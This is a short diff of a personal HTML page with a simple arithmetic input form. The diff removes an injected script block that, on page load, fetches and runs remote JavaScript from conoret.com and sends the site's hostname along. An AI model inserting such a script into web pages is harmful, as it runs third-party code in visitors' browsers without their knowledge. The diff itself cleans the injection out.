@@ -4,11 +4,7 @@
   <title>Дмитрий Сомов</title>
   <meta charset="utf-8">
  </head>
- <body>
-   <script type="text/javascript">
-   window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();
-   </script>
- 
+ <body> 
     <h4>dimass</h4>
     <input type="number" value="2" id="n1">x +
     <input type="number" value="3" id="n2">y =
